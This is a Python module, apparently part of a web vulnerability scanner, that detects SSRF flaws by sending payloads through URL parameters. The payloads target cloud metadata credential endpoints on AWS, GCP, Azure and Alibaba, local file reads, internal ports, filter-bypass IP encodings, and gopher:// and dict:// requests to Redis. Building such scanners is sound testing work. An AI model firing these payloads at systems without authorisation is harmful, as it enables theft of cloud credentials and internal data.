"""
SSRF (服务端请求伪造) 检测器

检测服务端请求伪造漏洞
"""

from typing import List, Optional, Dict, Any
import re
import time
import logging
from urllib.parse import urlparse, parse_qs

from ..base import BaseDetector
from ..result import DetectionResult, Severity, DetectorType
from ..factory import register_detector
from ..payloads import get_payloads, PayloadCategory

logger = logging.getLogger(__name__)


@register_detector('ssrf')
class SSRFDetector(BaseDetector):
    """SSRF (服务端请求伪造) 检测器

    检测 Server-Side Request Forgery 漏洞

    使用示例:
        detector = SSRFDetector()
        results = detector.detect("https://example.com/fetch", params={"url": "https://trusted.com"})
    """

    name = 'ssrf'
    description = 'SSRF 服务端请求伪造检测器'
    vuln_type = 'ssrf'
    severity = Severity.HIGH
    detector_type = DetectorType.ACCESS
    version = '1.0.0'

    # URL 参数名
    URL_PARAMS = [
        'url', 'uri', 'path', 'href', 'link',
        'src', 'source', 'target', 'dest', 'destination',
        'redirect', 'redirect_url', 'redirect_uri', 'return',
        'fetch', 'load', 'file', 'document',
        'page', 'view', 'content', 'proxy',
        'site', 'domain', 'host', 'feed',
        'next', 'callback', 'continue', 'goto',
        'image', 'img', 'avatar', 'icon',
    ]

    # 内网 IP 段
    INTERNAL_IPS = [
        '127.0.0.1',
        '127.0.0.0',
        'localhost',
        '0.0.0.0',
        '10.0.0.1',
        '172.16.0.1',
        '192.168.0.1',
        '192.168.1.1',
        '169.254.169.254',  # AWS 元数据
    ]

    # AWS 元数据响应特征
    AWS_METADATA_PATTERNS = [
        r'ami-id',
        r'instance-id',
        r'instance-type',
        r'local-ipv4',
        r'public-ipv4',
        r'security-credentials',
        r'iam/security-credentials',
        r'AccessKeyId',
        r'SecretAccessKey',
    ]

    # GCP 元数据响应特征
    GCP_METADATA_PATTERNS = [
        r'computeMetadata',
        r'project-id',
        r'instance/service-accounts',
        r'access_token',
        r'gcp',
    ]

    # Azure 元数据响应特征
    AZURE_METADATA_PATTERNS = [
        r'vmId',
        r'subscriptionId',
        r'resourceGroupName',
        r'location',
        r'sku',
    ]

    # Alibaba Cloud 元数据响应特征
    ALIBABA_METADATA_PATTERNS = [
        r'instance-id',
        r'private-ipv4',
        r'region-id',
        r'zone-id',
        r'ram/security-credentials',
    ]

    # 内网服务响应特征
    INTERNAL_SERVICE_PATTERNS = [
        r'Redis|REDIS',
        r'MongoDB',
        r'MySQL',
        r'PostgreSQL',
        r'Memcached',
        r'Elasticsearch',
        r'<title>.*Dashboard.*</title>',
        r'Apache Tomcat',
        r'Jenkins',
    ]

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """初始化检测器

        Args:
            config: 配置选项
                - oob_server: OOB 服务器地址
                - check_aws: 是否检测 AWS 元数据
                - check_gcp: 是否检测 GCP 元数据
                - check_azure: 是否检测 Azure 元数据
                - check_alibaba: 是否检测阿里云元数据
                - check_internal: 是否检测内网访问
                - check_protocols: 是否检测协议滥用 (dict://, gopher://)
                - check_blind: 是否检测盲 SSRF
        """
        super().__init__(config)

        # 加载 payload
        self.payloads = self._enhance_payloads(get_payloads(PayloadCategory.SSRF))

        # 编译模式
        self._aws_patterns = [
            re.compile(p, re.IGNORECASE) for p in self.AWS_METADATA_PATTERNS
        ]
        self._gcp_patterns = [
            re.compile(p, re.IGNORECASE) for p in self.GCP_METADATA_PATTERNS
        ]
        self._azure_patterns = [
            re.compile(p, re.IGNORECASE) for p in self.AZURE_METADATA_PATTERNS
        ]
        self._alibaba_patterns = [
            re.compile(p, re.IGNORECASE) for p in self.ALIBABA_METADATA_PATTERNS
        ]
        self._internal_patterns = [
            re.compile(p, re.IGNORECASE) for p in self.INTERNAL_SERVICE_PATTERNS
        ]

        # 配置
        self.oob_server = self.config.get('oob_server', None)
        self.check_aws = self.config.get('check_aws', True)
        self.check_gcp = self.config.get('check_gcp', True)
        self.check_azure = self.config.get('check_azure', True)
        self.check_alibaba = self.config.get('check_alibaba', True)
        self.check_internal = self.config.get('check_internal', True)
        self.check_protocols = self.config.get('check_protocols', True)
        self.check_blind = self.config.get('check_blind', True)

    def detect(self, url: str, **kwargs) -> List[DetectionResult]:
        """检测 SSRF 漏洞

        Args:
            url: 目标 URL
            **kwargs:
                params: GET 参数字典
                data: POST 数据字典
                method: HTTP 方法
                headers: 请求头

        Returns:
            检测结果列表
        """
        self._log_detection_start(url)
        results: List[DetectionResult] = []

        params = kwargs.get('params', {})
        data = kwargs.get('data', {})
        method = kwargs.get('method', 'GET').upper()
        headers = kwargs.get('headers', {})

        # 解析 URL 参数
        if not params:
            parsed = urlparse(url)
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        # 识别 URL 参数
        url_params = self._identify_url_params(params)

        for param_name in url_params:
            # 检测 AWS 元数据访问
            if self.check_aws:
                aws_result = self._test_aws_metadata(
                    url, params, param_name, method, headers
                )
                if aws_result:
                    results.append(aws_result)
                    continue

            # 检测 GCP 元数据访问
            if self.check_gcp:
                gcp_result = self._test_gcp_metadata(
                    url, params, param_name, method, headers
                )
                if gcp_result:
                    results.append(gcp_result)
                    continue

            # 检测 Azure 元数据访问
            if self.check_azure:
                azure_result = self._test_azure_metadata(
                    url, params, param_name, method, headers
                )
                if azure_result:
                    results.append(azure_result)
                    continue

            # 检测阿里云元数据访问
            if self.check_alibaba:
                alibaba_result = self._test_alibaba_metadata(
                    url, params, param_name, method, headers
                )
                if alibaba_result:
                    results.append(alibaba_result)
                    continue

            # 检测内网访问
            if self.check_internal:
                internal_result = self._test_internal_access(
                    url, params, param_name, method, headers
                )
                if internal_result:
                    results.append(internal_result)
                    continue

            # 检测本地文件协议
            file_result = self._test_file_protocol(
                url, params, param_name, method, headers
            )
            if file_result:
                results.append(file_result)
                continue

            # 检测协议滥用 (dict://, gopher://)
            if self.check_protocols:
                protocol_result = self._test_protocol_abuse(
                    url, params, param_name, method, headers
                )
                if protocol_result:
                    results.append(protocol_result)
                    continue

            # 检测盲 SSRF (仅当未发现其他漏洞时)
            if self.check_blind and not results:
                blind_result = self._test_blind_ssrf(
                    url, params, param_name, method, headers
                )
                if blind_result:
                    results.append(blind_result)

        self._log_detection_end(url, results)
        return results

    def _test_aws_metadata(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试 AWS 元数据访问

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        aws_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            # 绕过变体
            'http://2852039166/latest/meta-data/',  # IP 十进制
            'http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/',  # IP 十六进制
            'http://[::ffff:169.254.169.254]/latest/meta-data/',  # IPv6
            'http://169.254.169.254.nip.io/latest/meta-data/',  # DNS 重绑定
        ]

        for payload in aws_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                # 检查 AWS 元数据响应
                for pattern in self._aws_patterns:
                    if pattern.search(response.text):
                        request_info = self._build_request_info(
                            method=method,
                            url=url,
                            headers=headers,
                            params=test_params if method == 'GET' else None,
                            data=test_params if method != 'GET' else None
                        )
                        response_info = self._build_response_info(response)
                        return self._create_result(
                            url=url,
                            vulnerable=True,
                            param=param_name,
                            payload=payload,
                            evidence=f"检测到 AWS 元数据访问: {pattern.pattern}",
                            confidence=0.95,
                            verified=True,
                            request=request_info,
                            response=response_info,
                            remediation="限制服务端请求的目标，使用白名单机制",
                            references=[
                                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
                            ],
                            extra={
                                'ssrf_type': 'aws_metadata',
                                'target': '169.254.169.254'
                            }
                        )

            except Exception as e:
                logger.debug(f"AWS 元数据检测失败: {e}")

        return None

    def _test_internal_access(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试内网访问

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        # 常见内网端口
        internal_targets = [
            ('http://127.0.0.1:80', 'localhost:80'),
            ('http://127.0.0.1:8080', 'localhost:8080'),
            ('http://127.0.0.1:22', 'localhost:22'),
            ('http://127.0.0.1:3306', 'localhost:3306'),
            ('http://127.0.0.1:6379', 'localhost:6379'),
            ('http://127.0.0.1:27017', 'localhost:27017'),
            ('http://localhost/', 'localhost'),
            ('http://0.0.0.0/', '0.0.0.0'),
            # 绕过变体
            ('http://127.1/', '127.1'),
            ('http://0/', '0'),
            ('http://2130706433/', '127.0.0.1 decimal'),
            ('http://0x7f.0.0.1/', '127.0.0.1 hex'),
        ]

        for payload, target in internal_targets:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                start = time.time()

                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                elapsed = time.time() - start

                # 检查是否有内网服务响应
                for pattern in self._internal_patterns:
                    if pattern.search(response.text):
                        request_info = self._build_request_info(
                            method=method,
                            url=url,
                            headers=headers,
                            params=test_params if method == 'GET' else None,
                            data=test_params if method != 'GET' else None
                        )
                        response_info = self._build_response_info(response)
                        return self._create_result(
                            url=url,
                            vulnerable=True,
                            param=param_name,
                            payload=payload,
                            evidence=f"检测到内网服务响应: {pattern.pattern}",
                            confidence=0.85,
                            verified=True,
                            request=request_info,
                            response=response_info,
                            remediation="限制服务端请求的目标，禁止访问内网地址",
                            extra={
                                'ssrf_type': 'internal_access',
                                'target': target
                            }
                        )

                # 检查响应是否有意义的内容
                if response.status_code == 200 and len(response.text) > 100:
                    # 检查是否包含 HTML/JSON 内容
                    if any(marker in response.text.lower() for marker in ['<html', '<!doctype', '{"', '{']):
                        request_info = self._build_request_info(
                            method=method,
                            url=url,
                            headers=headers,
                            params=test_params if method == 'GET' else None,
                            data=test_params if method != 'GET' else None
                        )
                        response_info = self._build_response_info(response)
                        return self._create_result(
                            url=url,
                            vulnerable=True,
                            param=param_name,
                            payload=payload,
                            evidence=f"成功访问内网地址 {target}",
                            confidence=0.70,
                            verified=False,
                            request=request_info,
                            response=response_info,
                            remediation="限制服务端请求的目标，禁止访问内网地址",
                            extra={
                                'ssrf_type': 'internal_access',
                                'target': target,
                                'response_length': len(response.text)
                            }
                        )

            except Exception as e:
                logger.debug(f"内网访问检测失败: {e}")

        return None

    def _test_file_protocol(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试文件协议

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        file_payloads = [
            ('file:///etc/passwd', 'root:'),
            ('file:///etc/hosts', '127.0.0.1'),
            ('file:///c:/windows/win.ini', '[extensions]'),
        ]

        for payload, signature in file_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                if signature in response.text:
                    request_info = self._build_request_info(
                        method=method,
                        url=url,
                        headers=headers,
                        params=test_params if method == 'GET' else None,
                        data=test_params if method != 'GET' else None
                    )
                    response_info = self._build_response_info(response)
                    return self._create_result(
                        url=url,
                        vulnerable=True,
                        param=param_name,
                        payload=payload,
                        evidence=f"检测到本地文件读取: {signature}",
                        confidence=0.95,
                        verified=True,
                        request=request_info,
                        response=response_info,
                        remediation="禁用 file:// 协议处理",
                        extra={
                            'ssrf_type': 'file_protocol',
                            'target': payload
                        }
                    )

            except Exception as e:
                logger.debug(f"文件协议检测失败: {e}")

        return None

    def _identify_url_params(self, params: Dict[str, str]) -> List[str]:
        """识别 URL 参数

        Args:
            params: 参数字典

        Returns:
            URL 参数名列表
        """
        url_params = []

        for param_name, value in params.items():
            param_lower = param_name.lower()

            # 检查参数名
            if any(up in param_lower for up in self.URL_PARAMS):
                url_params.append(param_name)
                continue

            # 检查值是否像 URL
            if self._looks_like_url(value):
                url_params.append(param_name)

        return url_params

    def _looks_like_url(self, value: str) -> bool:
        """判断值是否像 URL"""
        if not value:
            return False

        # 检查 URL 协议
        if value.startswith(('http://', 'https://', 'ftp://', 'file://')):
            return True

        # 检查域名格式
        if re.match(r'^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+', value.lower()):
            return True

        return False

    def get_payloads(self) -> List[str]:
        """获取检测器使用的 payload 列表"""
        return self.payloads

    def _test_gcp_metadata(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试 GCP 元数据访问

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        gcp_payloads = [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/project/project-id',
            # 需要特殊头的变体
            'http://169.254.169.254/computeMetadata/v1/',
        ]

        for payload in gcp_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            # GCP 元数据服务需要特殊的请求头
            test_headers = headers.copy()
            test_headers['Metadata-Flavor'] = 'Google'

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=test_headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=test_headers)

                # 检查 GCP 元数据响应
                for pattern in self._gcp_patterns:
                    if pattern.search(response.text):
                        request_info = self._build_request_info(
                            method=method,
                            url=url,
                            headers=test_headers,
                            params=test_params if method == 'GET' else None,
                            data=test_params if method != 'GET' else None
                        )
                        response_info = self._build_response_info(response)
                        return self._create_result(
                            url=url,
                            vulnerable=True,
                            param=param_name,
                            payload=payload,
                            evidence=f"检测到 GCP 元数据访问: {pattern.pattern}",
                            confidence=0.95,
                            verified=True,
                            request=request_info,
                            response=response_info,
                            remediation="限制服务端请求的目标，使用白名单机制",
                            references=[
                                "https://cloud.google.com/compute/docs/metadata/overview"
                            ],
                            extra={
                                'ssrf_type': 'gcp_metadata',
                                'target': 'metadata.google.internal'
                            }
                        )

            except Exception as e:
                logger.debug(f"GCP 元数据检测失败: {e}")

        return None

    def _test_azure_metadata(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试 Azure 元数据访问

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        azure_payloads = [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
        ]

        for payload in azure_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            # Azure 元数据服务需要特殊的请求头
            test_headers = headers.copy()
            test_headers['Metadata'] = 'true'

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=test_headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=test_headers)

                # 检查 Azure 元数据响应
                for pattern in self._azure_patterns:
                    if pattern.search(response.text):
                        request_info = self._build_request_info(
                            method=method,
                            url=url,
                            headers=test_headers,
                            params=test_params if method == 'GET' else None,
                            data=test_params if method != 'GET' else None
                        )
                        response_info = self._build_response_info(response)
                        return self._create_result(
                            url=url,
                            vulnerable=True,
                            param=param_name,
                            payload=payload,
                            evidence=f"检测到 Azure 元数据访问: {pattern.pattern}",
                            confidence=0.95,
                            verified=True,
                            request=request_info,
                            response=response_info,
                            remediation="限制服务端请求的目标，使用白名单机制",
                            references=[
                                "https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service"
                            ],
                            extra={
                                'ssrf_type': 'azure_metadata',
                                'target': '169.254.169.254'
                            }
                        )

            except Exception as e:
                logger.debug(f"Azure 元数据检测失败: {e}")

        return None

    def _test_alibaba_metadata(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试阿里云元数据访问

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        alibaba_payloads = [
            'http://100.100.100.200/latest/meta-data/',
            'http://100.100.100.200/latest/meta-data/instance-id',
            'http://100.100.100.200/latest/meta-data/ram/security-credentials/',
            'http://100.100.100.200/latest/user-data/',
        ]

        for payload in alibaba_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                # 检查阿里云元数据响应
                for pattern in self._alibaba_patterns:
                    if pattern.search(response.text):
                        request_info = self._build_request_info(
                            method=method,
                            url=url,
                            headers=headers,
                            params=test_params if method == 'GET' else None,
                            data=test_params if method != 'GET' else None
                        )
                        response_info = self._build_response_info(response)
                        return self._create_result(
                            url=url,
                            vulnerable=True,
                            param=param_name,
                            payload=payload,
                            evidence=f"检测到阿里云元数据访问: {pattern.pattern}",
                            confidence=0.95,
                            verified=True,
                            request=request_info,
                            response=response_info,
                            remediation="限制服务端请求的目标，使用白名单机制",
                            references=[
                                "https://help.aliyun.com/document_detail/49122.html"
                            ],
                            extra={
                                'ssrf_type': 'alibaba_metadata',
                                'target': '100.100.100.200'
                            }
                        )

            except Exception as e:
                logger.debug(f"阿里云元数据检测失败: {e}")

        return None

    def _test_protocol_abuse(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试协议滥用 (dict://, gopher://)

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        protocol_payloads = [
            # Dict 协议 (常用于攻击 Redis)
            ('dict://127.0.0.1:6379/info', 'redis_version', 'dict'),
            ('dict://127.0.0.1:6379/CONFIG GET *', 'maxmemory', 'dict'),
            # Gopher 协议 (可构造任意 TCP 请求)
            ('gopher://127.0.0.1:6379/_INFO', 'redis', 'gopher'),
            ('gopher://127.0.0.1:6379/_CONFIG%20GET%20*', 'config', 'gopher'),
            # FTP 协议
            ('ftp://127.0.0.1:21', 'FTP', 'ftp'),
        ]

        for payload, signature, protocol in protocol_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                if signature.lower() in response.text.lower():
                    request_info = self._build_request_info(
                        method=method,
                        url=url,
                        headers=headers,
                        params=test_params if method == 'GET' else None,
                        data=test_params if method != 'GET' else None
                    )
                    response_info = self._build_response_info(response)
                    return self._create_result(
                        url=url,
                        vulnerable=True,
                        param=param_name,
                        payload=payload,
                        evidence=f"检测到 {protocol}:// 协议滥用: {signature}",
                        confidence=0.90,
                        verified=True,
                        request=request_info,
                        response=response_info,
                        remediation=f"禁用 {protocol}:// 协议处理，使用协议白名单",
                        extra={
                            'ssrf_type': 'protocol_abuse',
                            'protocol': protocol,
                            'target': payload
                        }
                    )

            except Exception as e:
                logger.debug(f"{protocol}:// 协议检测失败: {e}")

        return None

    def _test_blind_ssrf(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试盲 SSRF (基于时间差异和错误信息)

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        # 错误指示器 (可能表明存在 SSRF)
        error_indicators = [
            'connection refused', 'connection timed out',
            'could not connect', 'failed to connect',
            'no route to host', 'network unreachable',
            'name or service not known', 'getaddrinfo failed',
            'connection reset', 'socket error',
        ]

        # 使用会导致延迟的不可达 IP
        blind_payloads = [
            ('http://10.255.255.1', 5),  # 不可达的内网 IP
            ('http://192.168.255.255', 5),
            ('http://172.31.255.255', 5),
        ]

        # 先获取基线响应时间
        baseline_start = time.time()
        try:
            if method == 'GET':
                self.http_client.get(url, params=params, headers=headers)
            else:
                self.http_client.post(url, data=params, headers=headers)
            baseline_time = time.time() - baseline_start
        except Exception:
            baseline_time = 0

        for payload, expected_delay in blind_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                start_time = time.time()

                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                elapsed_time = time.time() - start_time
                response_text = response.text.lower() if response else ''

                # 检查错误指示器
                found_error = None
                for indicator in error_indicators:
                    if indicator in response_text:
                        found_error = indicator
                        break

                # 检查时间延迟 (响应时间超过预期延迟的70%且比基线多3秒以上)
                has_delay = elapsed_time >= expected_delay * 0.7 and elapsed_time >= baseline_time + 3

                if found_error or has_delay:
                    evidence_parts = []
                    if found_error:
                        evidence_parts.append(f"错误信息: {found_error}")
                    if has_delay:
                        evidence_parts.append(f"响应延迟: {elapsed_time:.2f}s (基线: {baseline_time:.2f}s)")

                    request_info = self._build_request_info(
                        method=method,
                        url=url,
                        headers=headers,
                        params=test_params if method == 'GET' else None,
                        data=test_params if method != 'GET' else None
                    )
                    response_info = self._build_response_info(response)

                    return self._create_result(
                        url=url,
                        vulnerable=True,
                        param=param_name,
                        payload=payload,
                        evidence="; ".join(evidence_parts),
                        confidence=0.60 if found_error else 0.50,
                        verified=False,  # 盲 SSRF 需要进一步验证
                        request=request_info,
                        response=response_info,
                        remediation="限制服务端请求的目标，使用白名单机制",
                        extra={
                            'ssrf_type': 'blind',
                            'error_indicator': found_error,
                            'response_time': elapsed_time,
                            'baseline_time': baseline_time,
                            'has_delay': has_delay
                        }
                    )

            except Exception as e:
                logger.debug(f"盲 SSRF 检测失败: {e}")

        return None
